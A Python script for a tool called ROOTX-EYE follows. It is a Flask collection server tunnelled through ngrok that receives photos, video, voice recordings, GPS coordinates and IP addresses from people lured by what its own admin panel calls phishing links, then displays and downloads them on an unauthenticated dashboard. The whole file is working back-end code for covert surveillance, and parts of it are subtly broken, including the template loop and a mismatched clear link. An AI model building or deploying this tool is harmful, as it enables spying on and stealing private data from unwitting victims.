#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════╗
║  ██████╗  ██████╗  ██████╗ ████████╗██╗  ██╗                ║
║  ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝╚██╗██╔╝                ║
║  ██████╔╝██║   ██║██║   ██║   ██║    ╚███╔╝                 ║
║  ██╔══██╗██║   ██║██║   ██║   ██║    ██╔██╗                 ║
║  ██║  ██║╚██████╔╝╚██████╔╝   ██║   ██╔╝ ██╗                ║
║  ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚═╝  ╚═╝                ║
║                                                               ║
║           🔥 ROOTX-EYE v5.0 - CINEMATIC EDITION 🔥          ║
║                                                               ║
║   📦 6 MODULES | 📊 LIVE PANEL | 🚀 AUTO NGROK             ║
║   💀 MATRIX RAIN | GLITCH EFFECTS | NO COPYRIGHT             ║
╚═══════════════════════════════════════════════════════════════╝
"""

import os
import sys
import json
import time
import threading
import subprocess
import base64
import random
import signal
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string, send_file
from flask_cors import CORS
import warnings
warnings.filterwarnings('ignore')

# ================= COLOR CODES =================
R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
B = '\033[94m'
P = '\033[95m'
C = '\033[96m'
W = '\033[0m'
O = '\033[38;5;208m'
BOLD = '\033[1m'
BLINK = '\033[5m'
DIM = '\033[2m'

# ================= CONFIG =================
PORT = 8081
DATA_DIR = "data"
CAPTURES_FILE = os.path.join(DATA_DIR, "captures.json")
NGROK_BIN = "ngrok"

os.makedirs(DATA_DIR, exist_ok=True)

# ================= GLOBAL DATA =================
captures = []
ngrok_url = ""
server_running = False
ngrok_process = None
server_thread = None

def load_captures():
    global captures
    if os.path.exists(CAPTURES_FILE):
        try:
            with open(CAPTURES_FILE, 'r') as f:
                captures = json.load(f)
        except:
            captures = []
    return captures

def save_captures():
    with open(CAPTURES_FILE, 'w') as f:
        json.dump(captures, f, indent=2)

load_captures()

# ================= CINEMATIC EFFECTS =================
def matrix_rain(duration=2):
    chars = "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"
    try:
        cols = os.get_terminal_size().columns
    except:
        cols = 80
    lines = [''.join(random.choice(chars) for _ in range(cols)) for _ in range(20)]
    start = time.time()
    while time.time() - start < duration:
        for i in range(len(lines)):
            line = list(lines[i])
            for j in range(cols):
                if random.random() < 0.05:
                    line[j] = random.choice(chars)
            lines[i] = ''.join(line)
            color = G if i < 7 else C if i < 14 else DIM
            sys.stdout.write(f"\033[{i+1};1H{color}{lines[i]}{W}")
        sys.stdout.flush()
        time.sleep(0.05)
    os.system('clear')

def loading_bar(text="Loading", duration=2):
    bar_len = 40
    steps = 40
    sys.stdout.write(f"\n{Y}{text}{W}\n")
    for i in range(steps + 1):
        percent = int((i / steps) * 100)
        filled = int((i / steps) * bar_len)
        bar = '█' * filled + '░' * (bar_len - filled)
        color = R if percent < 33 else Y if percent < 66 else G
        sys.stdout.write(f"\r[{color}{bar}{W}] {percent}%")
        sys.stdout.flush()
        time.sleep(duration / steps)
    sys.stdout.write("\n")
    sys.stdout.flush()

def glitch_effect(text):
    chars = "!@#$%^&*()_+{}|:<>?~"
    for _ in range(3):
        glitched = ''.join(random.choice(chars) if random.random() < 0.3 else c for c in text)
        sys.stdout.write(f"\r{R}{glitched}{W}")
        sys.stdout.flush()
        time.sleep(0.05)
    sys.stdout.write(f"\r{G}{text}{W}\n")
    sys.stdout.flush()

def animated_banner():
    os.system('clear')
    print(f"{DIM}Initializing ROOTX-EYE engine...{W}")
    time.sleep(0.3)
    matrix_rain(1.5)
    loading_bar("Loading ROOTX-EYE modules", 1.5)
    os.system('clear')
    logo = [
        "   ██████╗  ██████╗  ██████╗ ████████╗██╗  ██╗",
        "   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝╚██╗██╔╝",
        "   ██████╔╝██║   ██║██║   ██║   ██║    ╚███╔╝ ",
        "   ██╔══██╗██║   ██║██║   ██║   ██║    ██╔██╗ ",
        "   ██║  ██║╚██████╔╝╚██████╔╝   ██║   ██╔╝ ██╗",
        "   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚═╝  ╚═╝",
        "",
        "                 ███████╗██╗   ██╗███████╗",
        "                 ██╔════╝╚██╗ ██╔╝██╔════╝",
        "                 █████╗   ╚████╔╝ █████╗  ",
        "                 ██╔══╝    ╚██╔╝  ██╔══╝  ",
        "                 ███████╗   ██║   ███████╗",
        "                 ╚══════╝   ╚═╝   ╚══════╝",
        "",
        "                 R O O T X   E Y E",
        "                 ────────────────",
        "                    D E M O"
    ]
    for line in logo:
        glitch_effect(line)
        time.sleep(0.03)
    border = "╔" + "═" * 54 + "╗"
    print(f"\n{R}{border}{W}")
    print(f"{R}║{W}  {G}[✓] ROOTX EYE engine initialized{W}                     {R}║{W}")
    print(f"{R}║{W}  {C}[✓] Interface loaded{W}                                  {R}║{W}")
    print(f"{R}║{W}  {Y}[✓] Modules detected: 06{W}                             {R}║{W}")
    print(f"{R}║{W}  {G}[✓] Demo environment ready{W}                           {R}║{W}")
    print(f"{R}╚" + "═" * 54 + "╝{W}")
    time.sleep(0.5)

def banner():
    os.system('clear')
    print(f"""{R}
   ██████╗  ██████╗  ██████╗ ████████╗██╗  ██╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝╚██╗██╔╝
   ██████╔╝██║   ██║██║   ██║   ██║    ╚███╔╝ 
   ██╔══██╗██║   ██║██║   ██║   ██║    ██╔██╗ 
   ██║  ██║╚██████╔╝╚██████╔╝   ██║   ██╔╝ ██╗
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚═╝  ╚═╝
{W}""")
    print(f"{C}═══════════════════════════════════════════════════════════════{W}")
    print(f"{BOLD}{O}              🔥 ROOTX-EYE v5.0 - CINEMATIC EDITION 🔥{W}")
    print(f"{C}═══════════════════════════════════════════════════════════════{W}")
    print(f"{G}   📦 6 MODULES | 📊 LIVE PANEL | 🚀 AUTO NGROK{W}")
    print(f"{G}   💀 MATRIX RAIN | GLITCH EFFECTS | NO COPYRIGHT{W}")
    print(f"{C}═══════════════════════════════════════════════════════════════{W}")

# ================= CHECK NGROK =================
def check_ngrok():
    try:
        subprocess.run([NGROK_BIN, '--version'], capture_output=True, check=True)
        return True
    except:
        return False

def get_ngrok_url():
    try:
        import requests
        resp = requests.get('http://localhost:4040/api/tunnels', timeout=3)
        data = resp.json()
        if data['tunnels']:
            return data['tunnels'][0]['public_url']
    except:
        pass
    return None

# ================= FLASK APP =================
app = Flask(__name__)
CORS(app)

ADMIN_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>ROOTX-EYE Admin</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a1a; font-family: 'Segoe UI', sans-serif; color: #fff; padding: 20px; }
        .container { max-width: 1400px; margin: 0 auto; }
        .header { background: linear-gradient(135deg, #1a0033, #33001a); padding: 30px; border-radius: 15px; margin-bottom: 30px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
        .header h1 { font-size: 28px; background: linear-gradient(45deg, #ff0033, #ff0066); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .header .stats { background: rgba(255,255,255,0.05); padding: 10px 20px; border-radius: 10px; font-size: 13px; color: #aaa; }
        .header .stats span { color: #ff0066; font-weight: bold; font-size: 16px; }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 20px; }
        .card { background: rgba(255,255,255,0.05); border-radius: 12px; overflow: hidden; border: 1px solid rgba(255,255,255,0.08); transition: 0.3s; }
        .card:hover { transform: translateY(-5px); border-color: #ff0066; }
        .card .preview { width: 100%; height: 180px; background: #111; display: flex; justify-content: center; align-items: center; font-size: 50px; color: #333; overflow: hidden; }
        .card .preview img, .card .preview video { width: 100%; height: 100%; object-fit: cover; }
        .card .info { padding: 12px; }
        .card .info .type { display: inline-block; padding: 2px 10px; border-radius: 20px; font-size: 10px; font-weight: bold; text-transform: uppercase; background: #ff0066; color: #fff; margin-bottom: 6px; }
        .card .info .type.location { background: #3498db; }
        .card .info .type.voice { background: #f39c12; }
        .card .info .type.video { background: #9b59b6; }
        .card .info .time { color: #666; font-size: 11px; }
        .card .info .ip { color: #888; font-size: 11px; }
        .card .actions { padding: 8px 12px; background: rgba(255,255,255,0.02); display: flex; gap: 8px; flex-wrap: wrap; }
        .card .actions a { padding: 4px 12px; border-radius: 4px; text-decoration: none; font-size: 11px; font-weight: 500; }
        .btn-download { background: #00b894; color: #fff; }
        .btn-delete { background: #e74c3c; color: #fff; }
        .btn-clear { background: #e74c3c; color: #fff; padding: 8px 20px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
        .btn-refresh { background: #3498db; color: #fff; padding: 8px 20px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
        .empty { text-align: center; padding: 60px 20px; color: #555; font-size: 16px; grid-column: 1 / -1; }
        .empty .icon { font-size: 60px; margin-bottom: 15px; display: block; }
        .filters { display: flex; gap: 10px; margin-bottom: 20px; flex-wrap: wrap; align-items: center; }
        .filters select { padding: 6px 12px; background: #1a1a2e; border: 1px solid #333; color: #fff; border-radius: 5px; }
        .url-box { background: rgba(255,255,255,0.05); padding: 10px 15px; border-radius: 8px; margin-bottom: 20px; word-break: break-all; border: 1px solid rgba(255,255,255,0.1); }
        .url-box strong { color: #00ff88; }
        @media (max-width: 600px) { .header { flex-direction: column; text-align: center; gap: 15px; } .grid { grid-template-columns: 1fr; } }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div>
                <h1>👁️ ROOTX-EYE Admin</h1>
                <p style="color: #666; font-size: 13px;">Live Data Dashboard — Auto Refresh 10s</p>
            </div>
            <div class="stats">
                📦 Total: <span>{{ captures|length }}</span>
                &nbsp;|&nbsp; 📱 Types: 
                <span>
                    {% set types = {} %}
                    {% for c in captures %}
                        {% set t = c.type %}
                        {% set _ = types.update({t: types.get(t, 0) + 1}) %}
                    {% endfor %}
                    {{ types|join(', ') }}
                </span>
            </div>
        </div>
        
        {% if ngrok_url %}
        <div class="url-box">
            <strong>🔗 Public Link:</strong> {{ ngrok_url }}<br>
            <strong>📊 Admin:</strong> {{ ngrok_url }}
        </div>
        {% endif %}

        <div class="filters">
            <select id="filterType" onchange="filterCards()">
                <option value="all">All Types</option>
                <option value="photo">📷 Photo</option>
                <option value="location">📍 Location</option>
                <option value="voice">🎤 Voice</option>
                <option value="video">🎥 Video</option>
            </select>
            <button class="btn-refresh" onclick="location.reload()">🔄 Refresh</button>
            <button class="btn-clear" onclick="if(confirm('Delete all data?')) location.href='?clear=all'">🗑️ Clear All</button>
        </div>

        <div class="grid" id="cardGrid">
            {% if captures|length == 0 %}
                <div class="empty">
                    <span class="icon">📭</span>
                    No data captured yet.<br>
                    <small style="color:#444;">Share phishing links to collect data</small>
                </div>
            {% else %}
                {% for idx, capture in captures|reverse %}
                <div class="card" data-type="{{ capture.type }}">
                    <div class="preview">
                        {% if capture.type == 'photo' %}
                            <img src="/file/{{ capture.filename }}" alt="Photo">
                        {% elif capture.type == 'video' %}
                            <video src="/file/{{ capture.filename }}" muted></video>
                        {% elif capture.type == 'voice' %}
                            <div style="text-align:center; padding:10px;">
                                <div style="font-size:50px;">🎤</div>
                                <audio controls style="width:100%; margin-top:10px;">
                                    <source src="/file/{{ capture.filename }}" type="audio/mpeg">
                                </audio>
                            </div>
                        {% elif capture.type == 'location' %}
                            <div style="text-align:center; padding:20px;">
                                <div style="font-size:40px;">📍</div>
                                <div style="font-size:13px; color:#aaa; margin-top:10px;">
                                    Lat: {{ capture.lat }}<br>
                                    Lng: {{ capture.lng }}
                                </div>
                                <a href="https://maps.google.com/?q={{ capture.lat }},{{ capture.lng }}" target="_blank" style="color:#3498db; font-size:12px;">View Map</a>
                            </div>
                        {% endif %}
                    </div>
                    <div class="info">
                        <span class="type {{ capture.type }}">{{ capture.type }}</span>
                        <div class="time">🕐 {{ capture.time }}</div>
                        <div class="ip">🌐 IP: {{ capture.ip }}</div>
                        <div style="font-size:11px; color:#666; margin-top:4px;">{{ capture.user_agent[:40] }}...</div>
                    </div>
                    <div class="actions">
                        {% if capture.type != 'location' %}
                            <a href="/download/{{ idx }}" class="btn-download">⬇️ Download</a>
                        {% endif %}
                        <a href="/delete/{{ idx }}" class="btn-delete" onclick="return confirm('Delete this?')">🗑️ Delete</a>
                    </div>
                </div>
                {% endfor %}
            {% endif %}
        </div>
    </div>
    <script>
        function filterCards() {
            const filter = document.getElementById('filterType').value;
            document.querySelectorAll('.card').forEach(card => {
                card.style.display = (filter === 'all' || card.dataset.type === filter) ? 'block' : 'none';
            });
        }
        setTimeout(() => location.reload(), 10000);
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(ADMIN_HTML, captures=load_captures(), ngrok_url=ngrok_url)

@app.route('/file/<filename>')
def serve_file(filename):
    filepath = os.path.join(DATA_DIR, filename)
    if os.path.exists(filepath):
        return send_file(filepath)
    return "File not found", 404

@app.route('/download/<int:idx>')
def download_file(idx):
    caps = load_captures()
    if idx < len(caps):
        filepath = os.path.join(DATA_DIR, caps[idx]['filename'])
        if os.path.exists(filepath):
            return send_file(filepath, as_attachment=True)
    return "File not found", 404

@app.route('/delete/<int:idx>')
def delete_capture(idx):
    caps = load_captures()
    if idx < len(caps):
        filepath = os.path.join(DATA_DIR, caps[idx]['filename'])
        if os.path.exists(filepath):
            os.remove(filepath)
        del caps[idx]
        with open(CAPTURES_FILE, 'w') as f:
            json.dump(caps, f, indent=2)
    return "Deleted", 302, {'Location': '/'}

@app.route('/clear')
def clear_all():
    caps = load_captures()
    for c in caps:
        filepath = os.path.join(DATA_DIR, c.get('filename', ''))
        if os.path.exists(filepath):
            os.remove(filepath)
    with open(CAPTURES_FILE, 'w') as f:
        json.dump([], f, indent=2)
    return "Cleared", 302, {'Location': '/'}

@app.route('/capture', methods=['POST'])
def capture():
    caps = load_captures()
    data = request.json or {}
    capture = {
        'type': data.get('type', 'unknown'),
        'ip': request.headers.get('X-Forwarded-For', request.remote_addr),
        'user_agent': request.headers.get('User-Agent', 'Unknown'),
        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'filename': '',
        'lat': data.get('lat'),
        'lng': data.get('lng')
    }
    if 'file' in request.files:
        file = request.files['file']
        ext = 'jpg' if capture['type'] == 'photo' else 'mp4' if capture['type'] == 'video' else 'mp3'
        filename = f"{capture['type']}_{int(time.time())}.{ext}"
        filepath = os.path.join(DATA_DIR, filename)
        file.save(filepath)
        capture['filename'] = filename
    if data.get('file') and not capture['filename']:
        file_data = base64.b64decode(data['file'].split(',')[1] if ',' in data['file'] else data['file'])
        ext = 'jpg' if capture['type'] == 'photo' else 'mp4' if capture['type'] == 'video' else 'mp3'
        filename = f"{capture['type']}_{int(time.time())}.{ext}"
        filepath = os.path.join(DATA_DIR, filename)
        with open(filepath, 'wb') as f:
            f.write(file_data)
        capture['filename'] = filename
    caps.append(capture)
    with open(CAPTURES_FILE, 'w') as f:
        json.dump(caps, f, indent=2)
    return jsonify({'status': 'success', 'id': len(caps)-1})

@app.route('/api/status')
def api_status():
    caps = load_captures()
    return jsonify({
        'total': len(caps),
        'types': {t: sum(1 for c in caps if c.get('type') == t) for t in set(c.get('type') for c in caps)}
    })

def start_server():
    global server_running
    server_running = True
    app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True, use_reloader=False)

def start_ngrok():
    global ngrok_url, ngrok_process
    try:
        if not check_ngrok():
            print(f"{R}[!] Ngrok not found. Installing...{W}")
            os.system('wget -q https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip')
            os.system('unzip -q -o ngrok-stable-linux-arm64.zip')
            os.system(f'mv ngrok {os.environ.get("PREFIX", "/usr")}/bin/')
            os.system(f'chmod +x {os.environ.get("PREFIX", "/usr")}/bin/ngrok')
        ngrok_process = subprocess.Popen([NGROK_BIN, 'http', str(PORT)], 
                                        stdout=subprocess.DEVNULL, 
                                        stderr=subprocess.DEVNULL)
        time.sleep(3)
        url = get_ngrok_url()
        if url:
            ngrok_url = url
            return True
        return False
    except Exception as e:
        print(f"{R}[!] Ngrok error: {e}{W}")
        return False

def main():
    global server_running, ngrok_url, ngrok_process, server_thread
    animated_banner()
    while True:
        banner()
        caps = load_captures()
        status_color = G if server_running else R
        status_text = "RUNNING" if server_running else "STOPPED"
        ngrok_status = f"{G}{ngrok_url}{W}" if ngrok_url else f"{R}Not Started{W}"
        print(f"\n{C}═══════════════════════════════════════════════════════════════{W}")
        print(f"{B}📦 CAPTURES: {len(caps)}{W}")
        print(f"{B}🔄 SERVER: {status_color}{status_text}{W}")
        print(f"{B}🔗 NGROK: {ngrok_status}{W}")
        print(f"{C}═══════════════════════════════════════════════════════════════{W}")
        print(f"\n{Y}[1] 🚀 START SERVER + NGROK{W}")
        print(f"{C}[2] 📡 START SERVER (Local Only){W}")
        print(f"{B}[3] 🔗 SHOW NGROK URL{W}")
        print(f"{G}[4] 📊 VIEW ADMIN PANEL (Browser){W}")
        print(f"{P}[5] 📋 SHOW CAPTURES COUNT{W}")
        print(f"{R}[6] 🛑 STOP SERVER{W}")
        print(f"{R}[7] 🗑️ CLEAR ALL DATA{W}")
        print(f"{C}[8] ❌ EXIT{W}")
        print(f"{C}═══════════════════════════════════════════════════════════════{W}")
        choice = input(f"{Y}➜ CHOOSE: {W}")
        if choice == '1':
            if server_running:
                print(f"{Y}[!] Server already running{W}")
                input("Press Enter...")
                continue
            loading_bar("Starting Server", 1)
            server_thread = threading.Thread(target=start_server, daemon=True)
            server_thread.start()
            time.sleep(2)
            server_running = True
            loading_bar("Starting Ngrok Tunnel", 1)
            if start_ngrok():
                print(f"{G}[+] Ngrok started: {ngrok_url}{W}")
                print(f"{G}[+] Admin Panel: {ngrok_url}/{W}")
            else:
                print(f"{R}[!] Ngrok failed.{W}")
                print(f"{Y}[!] Local URL: http://localhost:{PORT}{W}")
            input("Press Enter...")
        elif choice == '2':
            if server_running:
                print(f"{Y}[!] Server already running{W}")
                input("Press Enter...")
                continue
            loading_bar("Starting Server", 1)
            server_thread = threading.Thread(target=start_server, daemon=True)
            server_thread.start()
            time.sleep(2)
            server_running = True
            print(f"{G}[+] Server started on http://localhost:{PORT}{W}")
            input("Press Enter...")
        elif choice == '3':
            if ngrok_url:
                print(f"{G}[+] Ngrok URL: {ngrok_url}{W}")
            else:
                url = get_ngrok_url()
                if url:
                    ngrok_url = url
                    print(f"{G}[+] Ngrok URL: {ngrok_url}{W}")
                else:
                    print(f"{R}[!] Ngrok not running.{W}")
            input("Press Enter...")
        elif choice == '4':
            if server_running:
                url = ngrok_url if ngrok_url else f"http://localhost:{PORT}"
                print(f"{G}[+] Opening Admin Panel: {url}{W}")
                try:
                    subprocess.run(['termux-open', url], check=False)
                except:
                    print(f"{Y}[!] Copy this URL: {url}{W}")
            else:
                print(f"{R}[!] Server not running.{W}")
            input("Press Enter...")
        elif choice == '5':
            caps = load_captures()
            print(f"{G}[+] Total Captures: {len(caps)}{W}")
            if caps:
                types = {}
                for c in caps:
                    t = c.get('type', 'unknown')
                    types[t] = types.get(t, 0) + 1
                print(f"{C}📊 Types: {types}{W}")
            input("Press Enter...")
        elif choice == '6':
            server_running = False
            if ngrok_process:
                try:
                    ngrok_process.terminate()
                    ngrok_process = None
                    ngrok_url = ""
                except:
                    pass
            loading_bar("Stopping Server", 1)
            print(f"{R}[!] Server Stopped{W}")
            input("Press Enter...")
        elif choice == '7':
            caps = load_captures()
            for c in caps:
                filepath = os.path.join(DATA_DIR, c.get('filename', ''))
                if os.path.exists(filepath):
                    os.remove(filepath)
            with open(CAPTURES_FILE, 'w') as f:
                json.dump([], f, indent=2)
            print(f"{R}[+] All data cleared{W}")
            input("Press Enter...")
        elif choice == '8':
            if server_running:
                server_running = False
                if ngrok_process:
                    try:
                        ngrok_process.terminate()
                    except:
                        pass
            print(f"{R}[!] Exiting...{W}")
            matrix_rain(2)
            print(f"\n{G}🔥 ROOTX-EYE terminated successfully{W}")
            sys.exit(0)
        else:
            print(f"{R}[!] Invalid choice{W}")
            input("Press Enter...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{R}[!] Interrupted by user{W}")
        sys.exit(0)
